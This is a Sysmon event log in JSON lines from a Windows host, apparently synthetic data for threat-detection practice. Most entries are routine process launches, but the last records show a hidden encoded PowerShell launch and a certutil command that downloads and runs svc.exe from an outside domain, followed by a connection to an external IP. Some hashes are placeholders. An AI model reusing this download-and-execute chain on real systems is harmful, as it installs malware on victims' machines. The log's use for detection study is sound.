{"timestamp": "2024-06-10T01:20:30", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x87c63", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2668, "ParentProcessId": 2667, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1f312a8cc32b9836a3cc09a090e2af44e4480ceca24ca4b79bca26a8efbb162e", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:20:49", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x664d2", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2670, "ParentProcessId": 2669, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3fa5d3e8151bcabde5468ef860fad855bc8afb56463eb2c36c7543a19194c2d8", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:21:02", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7da2b", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2672, "ParentProcessId": 2671, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=8cd447bafc5379ca044b275e4bc68e47ab1c3ff9e72de6778dd2941fd896dce6", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:21:16", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x47f71", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2674, "ParentProcessId": 2673, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3427366afc909f398ea6c0b97636a4ecb93fdeb3fe0451faefb2773ebe74ff55", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:21:17", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": null, "CommandLine": null, "ProcessId": 2674, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 80, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:21:40", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x55eed", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2676, "ParentProcessId": 2675, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=f2b3a6052bdce01aac9ea5437510e9199f23899424d548740c96631f5677b989", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:22:01", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4887e", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2678, "ParentProcessId": 2677, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3c6af46aeecf6b00b6a5001b60c80dff1a15d794e6513e14e61003ce60ad6eaa", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:22:12", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x53670", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2680, "ParentProcessId": 2679, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=109d5e5c055d67fb13a98334b4fd72e4feaea5b35317c5aa94845f6e362ddb11", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:22:32", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x714e0", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2682, "ParentProcessId": 2681, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1c9ffda68861268178a2a9ac1cc2b6f03f123e83bbe490b4a5cebb87890d96ef", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:22:45", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6a1de", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2684, "ParentProcessId": 2683, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=a8b1f98df92bfe881d2181ea24eb6c5f4c46a2c2644659b2ba05e4c363b7aae8", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:22:49", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x426ef", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2686, "ParentProcessId": 2685, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=9dd6d7764e50af4769e024124e35dacf94a79cf82256ca1662cad29c0e9a9dba", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:23:10", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x88df4", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2688, "ParentProcessId": 2687, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=923e012425f9ac7f68389e73ff195ad73cf3dcb2c0ba7995135c8f1ace9a774e", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:23:28", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x58acc", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2690, "ParentProcessId": 2689, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=997496f10069e40af3cc19e7ce18ddfb107f448aa33f34a5b34e70ceeb8ed161", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:23:29", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": null, "CommandLine": null, "ProcessId": 2690, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 443, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:23:51", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x56c00", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2692, "ParentProcessId": 2691, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1090aec3d58161fcd05bfc9285a950378b8d150282663532e2f0133f6d599fb2", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:24:03", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4ae9b", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2694, "ParentProcessId": 2693, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cd2b4c9690b7ff55a1c021b84ed4d650cf936e0d0e9ad1f90ce2adf45ed367a1", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:24:17", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7f4dd", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2696, "ParentProcessId": 2695, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5525dec4ec3a2157df4ad79f4943c3d08dceb809fd37a12a46ce9583fd4d6c1f", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:24:33", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6ed36", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2698, "ParentProcessId": 2697, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5e46bd13cb1fa376bfc954a6a3387e6576d228f0979d29646b5b3902d8b25f1d", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:24:42", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7a913", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2700, "ParentProcessId": 2699, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1bfe379b80b6493952b54d5c2d71aa5686e5b72988224d514bb65843ac05a2c1", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:24:56", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x8a3a5", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2702, "ParentProcessId": 2701, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=ea9b109582923dda170a5fb49ee855980d8abd0f8ab760a02d8b4a33f7f3ec87", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:25:17", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5e0fb", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2704, "ParentProcessId": 2703, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=f2696ee3497cea30c95d3f2654fbb887527fa3392fdf47cc8ab66b64de8d38dc", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:25:33", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x77666", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2706, "ParentProcessId": 2705, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d5eae739ffb9e23be5714ee2e1e0367040ee0e6c74eb9f65948582fe52403593", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:25:34", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": null, "CommandLine": null, "ProcessId": 2706, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 80, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:25:40", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x53efb", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2708, "ParentProcessId": 2707, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d5e781d081e4dea755692ed85ab03dab552b0600b754a98e9652e4f7c83d4d13", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:25:53", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x61249", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2710, "ParentProcessId": 2709, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5cd748d9bb960eccfae4a5ae4d348d4dfeb1c016f09b64f9ad1d38740bafa854", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:26:18", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x63201", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2712, "ParentProcessId": 2711, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5c2a3b31cfddc09d6aef470c1124c231026dd08eab60b95c84fe5d07abfed728", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:26:33", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x82019", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2714, "ParentProcessId": 2713, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3f10f70e2afa886e02fb950ededf715565955e3ad27b0230b86e066ba2d27da6", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:26:36", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x60817", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2716, "ParentProcessId": 2715, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1fcd4ebd0cf876a292bac5fa4201767db063a604ff3f8ccf091b104b1d4f5eda", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:26:48", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x710d5", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2718, "ParentProcessId": 2717, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cc8409966be2bd63108b215776e264899692b2df6be1058318817d4568f03643", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:26:51", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7d99d", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2720, "ParentProcessId": 2719, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=488d4f53ac37f0fad67e6699e8c7f26a31e1b74c56a6f511d17089077ac59fbc", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T02:10:00", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5D6AC", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKABuAGUAdw\u2026", "ProcessId": 4802, "ParentProcessId": 4700, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=aa11bb22", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T02:10:30", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5D6AC", "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "certutil.exe -urlcache -split -f http://cdn-update.top/win/svc.exe C:\\ProgramData\\svc.exe", "ProcessId": 4850, "ParentProcessId": 4802, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cc33dd44", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T02:10:31", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 22, "event_type": "dns_query", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 4850, "ParentProcessId": null, "dest_ip": null, "dest_port": null, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": "cdn-update.top", "TargetImage": null}
{"timestamp": "2024-06-10T02:10:45", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 11, "event_type": "file_create", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 4850, "ParentProcessId": null, "dest_ip": null, "dest_port": null, "Hashes": null, "TargetFilename": "C:\\ProgramData\\svc.exe", "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T02:11:10", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5D6AC", "Image": "C:\\ProgramData\\svc.exe", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "C:\\ProgramData\\svc.exe", "ProcessId": 4920, "ParentProcessId": 4802, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=e7f2a1c93b6d5804fae21c7d0b9a3e6612ff45aa10cd9b7e2f3a4c5d6e7f8091", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T02:11:15", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\ProgramData\\svc.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 4920, "ParentProcessId": null, "dest_ip": "185.244.25.171", "dest_port": 443, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
